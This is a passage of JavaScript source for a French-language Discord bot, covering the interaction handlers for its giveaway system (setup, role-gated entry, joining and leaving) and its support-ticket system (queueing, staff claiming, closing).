                    set_gw_duration: ['Durée (ex: 10m, 2h, 1d)', 'gwTime', TextInputStyle.Short],
                    set_gw_winners: ['Nombre de Gagnants', 'gwWinners', TextInputStyle.Short]
                };

                const [label, modalType, style] = typeMap[interaction.customId];
                const modal = new ModalBuilder()
                    .setCustomId(`${modalType}_${userId}`)
                    .setTitle(`Configurer : ${label}`);

                const input = new TextInputBuilder()
                    .setCustomId('input')
                    .setLabel(label)
                    .setStyle(style)
                    .setRequired(true);

                modal.addComponents(new ActionRowBuilder().addComponents(input));
                return await interaction.showModal(modal);
            }

            if (interaction.customId === 'set_gw_condition') {
                const select = new RoleSelectMenuBuilder()
                    .setCustomId(`gwCondition_${userId}`)
                    .setPlaceholder('Choisir le rôle requis...');

                return await interaction.reply({ content: 'Sélectionnez le rôle nécessaire pour participer :', components: [new ActionRowBuilder().addComponents(select)], flags: [MessageFlags.Ephemeral] });
            }

            if (interaction.customId === 'launch_gw') {
                const data = gwData.get(userId);
                if (!data || !data.prize || !data.time || !data.winners) {
                    return interaction.reply({ content: 'Le lot, la durée et le nombre de gagnants sont obligatoires pour lancer le giveaway.', flags: [MessageFlags.Ephemeral] });
                }

                const match = data.time.match(/^(\d+)([smhd])$/);
                if (!match) return interaction.reply({ content: 'Format de durée invalide. Utilisez s, m, h ou d (ex: 10m, 2h).', flags: [MessageFlags.Ephemeral] });

                const select = new ChannelSelectMenuBuilder()
                    .setCustomId(`gwlaunchChannel_${userId}`)
                    .setPlaceholder('Choisir le salon...')
                    .addChannelTypes(ChannelType.GuildText);

                return await interaction.reply({ content: 'Sélectionnez le salon où lancer le Giveaway :', components: [new ActionRowBuilder().addComponents(select)], flags: [MessageFlags.Ephemeral] });
            }

            if (interaction.customId === 'gw_join') {
                const msgId = interaction.message.id;
                
                const res = await db.query('SELECT participants, required_role_id FROM giveaways WHERE message_id = $1 AND ended = FALSE', [msgId]);
                if (res.rows.length === 0) {
                    return interaction.reply({ content: 'Ce giveaway est terminé ou introuvable.', flags: [MessageFlags.Ephemeral] });
                }

                const row_data = res.rows[0];
                if (row_data.required_role_id && !interaction.member.roles.cache.has(row_data.required_role_id)) {
                    return interaction.reply({ content: `⚠️ Vous devez avoir le rôle <@&${row_data.required_role_id}> pour participer à ce giveaway. Pour l'avoir automatiquement, vous devez mettre le lien de notre serveur en status discord ! pas bio ! et vous mettres en ligne !`, flags: [MessageFlags.Ephemeral] });
                }

                let participants = row_data.participants || [];
                if (participants.includes(userId)) {
                    participants = participants.filter(id => id !== userId);
                    await db.query('UPDATE giveaways SET participants = $1 WHERE message_id = $2', [JSON.stringify(participants), msgId]);

                    const newRow = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('gw_join').setLabel(`🎉 Participer (${participants.length})`).setStyle(ButtonStyle.Primary)
                    );
                    await interaction.message.edit({ components: [newRow] }).catch(()=>null);
                    return interaction.reply({ content: 'Vous avez quitté le giveaway.', flags: [MessageFlags.Ephemeral] });
                }

                participants.push(userId);
                await db.query('UPDATE giveaways SET participants = $1 WHERE message_id = $2', [JSON.stringify(participants), msgId]);

                const newRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('gw_join').setLabel(`🎉 Participer (${participants.length})`).setStyle(ButtonStyle.Primary)
                );
                await interaction.message.edit({ components: [newRow] }).catch(()=>null);
                
                return interaction.reply({ content: 'Participation confirmée ! 🎉 Bonne chance.', flags: [MessageFlags.Ephemeral] });
            }

            if (interaction.customId.startsWith('open_ticket_')) {
                const type = interaction.customId.split('_')[2]; // vip or general
                const guild = interaction.guild;
                
                const currentCount = getTicketCount(guild);
                if (currentCount >= MAX_TICKETS) {
                    const res = await db.query('SELECT 1 FROM ticket_queue WHERE user_id = $1', [interaction.user.id]);
                    if (res.rows.length === 0) {
                        await db.query(
                            'INSERT INTO ticket_queue (user_id, type, timestamp) VALUES ($1, $2, $3)',
                            [interaction.user.id, type, Date.now()]
                        );
                    }
                    return await interaction.reply({ 
                        content: '⚠️ Notre équipe rencontre actuellement une forte affluence. Vous avez été placé en file d\'attente. Vous recevrez un message privé dès que votre ticket sera créé.', 
                        flags: [MessageFlags.Ephemeral] 
                    });
                }

                await createTicket(guild, interaction.user, type);
                return await interaction.reply({ content: `Votre ticket a été créé dans la catégorie **${type === 'vip' ? 'VIP' : 'Général'}**.`, flags: [MessageFlags.Ephemeral] });
            }

            if (interaction.customId === 'claim_ticket') {
                if (!interaction.member.roles.cache.has(STAFF_ROLE_ID)) {
                    return await interaction.reply({ content: 'Seul le staff peut claim ce ticket.', flags: [MessageFlags.Ephemeral] });
                }
                
                const embed = EmbedBuilder.from(interaction.message.embeds[0]);
                embed.addFields({ name: 'Claim par', value: `${interaction.user}` });
                
                await interaction.update({ 
                    embeds: [embed], 
                    components: [new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('claim_ticket').setLabel('Claimed').setStyle(ButtonStyle.Success).setDisabled(true),
                        new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger)
                    )] 
                });
                return interaction.followUp({ content: `Le ticket a été pris en charge par ${interaction.user}.` });
            }

            if (interaction.customId === 'close_ticket') {
                await interaction.reply({ content: 'Le ticket va être fermé dans 5 secondes...' });
                setTimeout(async () => {
                    const guild = interaction.guild;
                    await interaction.channel.delete().catch(() => {});
                    processTicketQueue(guild); // On vérifie si quelqu'un peut sortir de la file d'attente
                }, 5000);
                return;
            }
        }
    } catch (error) {
        logError(error, 'Event: interactionCreate');
    }
});

client.login(process.env.TOKEN);
